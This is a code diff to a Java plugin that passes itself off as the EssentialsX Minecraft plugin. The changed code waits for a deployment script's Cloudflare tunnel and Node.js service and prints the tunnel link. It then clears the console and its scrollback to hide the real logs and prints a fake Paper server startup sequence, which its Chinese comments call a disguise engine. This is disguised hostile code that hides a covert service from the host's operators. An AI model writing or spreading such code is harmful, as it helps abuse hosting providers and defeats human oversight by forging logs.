@@ -437,7 +437,7 @@ public class EssentialsX extends JavaPlugin {
     }
     
     // ============================================================
-    // 仿真伪装日志引擎 (严格验证 + 彻底清屏 + 完美复刻)
+    // 仿真伪装日志引擎 (真实链接末尾打印 + 4秒清屏 + 纯净伪装)
     // ============================================================
 
     private void startFakeLogs() {
@@ -449,7 +449,7 @@ public class EssentialsX extends JavaPlugin {
                 String tunnelUrl = "";
                 String nodePort = "25565";
                 
-                // 1. 等待部署脚本生成 Tunnel URL 和 端口 (最多等待3分钟)
+                // 1. 等待部署脚本生成 Tunnel URL
                 for (int i = 0; i < 180; i++) {
                     if (Files.exists(tunnelFile) && Files.exists(portFile)) {
                         String urlContent = new String(Files.readAllBytes(tunnelFile)).trim();
@@ -463,9 +463,9 @@ public class EssentialsX extends JavaPlugin {
                     Thread.sleep(1000);
                 }
 
-                if (tunnelUrl.isEmpty()) return; // 隧道获取失败则放弃伪装
+                if (tunnelUrl.isEmpty()) return; 
 
-                // 2. 严格健康检测：确保 Node.js 端口已通
+                // 2. 严格健康检测：Node 存活
                 boolean nodeAlive = false;
                 for (int i = 0; i < 30; i++) {
                     try (java.net.Socket s = new java.net.Socket("localhost", Integer.parseInt(nodePort))) {
@@ -473,7 +473,7 @@ public class EssentialsX extends JavaPlugin {
                     } catch (Exception e) { Thread.sleep(1000); }
                 }
 
-                // 3. 严格健康检测：确保 CF 隧道不是 502
+                // 3. 严格健康检测：CF 非 502
                 boolean cfAlive = false;
                 if (nodeAlive) {
                     for (int i = 0; i < 30; i++) {
@@ -490,17 +490,33 @@ public class EssentialsX extends JavaPlugin {
                     }
                 }
 
-                if (!cfAlive) return; // 隧道不通则放弃伪装
+                if (!cfAlive) return; 
 
-                // 4. 检测全部通过，等待 4 秒让真实日志全部刷完
+                // 4. 等待真实的 MC 服务器启动完成 (监听真实MC端口)
+                String mcPortStr = System.getenv().getOrDefault("SERVER_PORT", "25565");
+                int mcPort = Integer.parseInt(mcPortStr);
+                boolean mcReady = false;
+                for (int i = 0; i < 120; i++) {
+                    try (java.net.Socket s = new java.net.Socket("localhost", mcPort)) {
+                        mcReady = true; break;
+                    } catch (Exception e) { Thread.sleep(1000); }
+                }
+                
+                if (!mcReady) return;
+
+                // 5. 在真实日志的最后，打印链接
+                Thread.sleep(1000); // 稍等让真实的 Done! 日志刷出来
+                mcLog("Binding remote endpoint to: " + tunnelUrl);
+
+                // 6. 等待 4 秒，让用户复制链接，并让真实日志彻底刷完
                 Thread.sleep(4000);
 
-                // 5. 彻底暴力清屏 (清除屏幕并清除回滚缓冲区，往上翻也看不到真实日志)
+                // 7. 强力清屏 (清除屏幕并清除回滚缓冲区，往上翻页也看不到真实日志)
                 clearConsole();
                 Thread.sleep(300);
 
-                // 6. 开始打印完美的伪装日志序列
-                int delay = 50; // 基础延迟
+                // 8. 打印完美伪装的启动日志 (无链接，无真实IP)
+                int delay = 50; 
 
                 RAW_OUT.println("container@tropicalgames.net java -version");
                 Thread.sleep(delay);
@@ -571,10 +587,8 @@ public class EssentialsX extends JavaPlugin {
                 mcLog("Generating keypair");
                 Thread.sleep(delay);
                 
-                // ★ 隐蔽推流真实链接
-                mcLog("Starting Minecraft server on 0.0.0.0:" + nodePort);
-                Thread.sleep(delay);
-                mcLog("Binding remote endpoint to: " + tunnelUrl);
+                // ★ 此处仅打印伪装端口，绝不打印链接和真实IP
+                mcLog("Starting Minecraft server on 0.0.0.0:" + mcPortStr);
                 Thread.sleep(delay);
                 
                 mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.");
